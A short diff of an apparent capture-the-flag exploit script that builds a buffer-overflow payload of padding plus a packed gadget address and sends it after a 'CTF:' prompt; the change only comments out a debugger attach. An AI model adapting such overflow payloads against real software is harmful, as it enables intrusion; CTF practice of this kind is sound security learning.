@@ -42,7 +42,7 @@ write_gadget = 0x8048087
 payload1 = 'A' * padding
 payload1 += p32(write_gadget)
 
-gdb.attach(s)
+#gdb.attach(s)
 
 s.sendlineafter('CTF:', payload1)
 
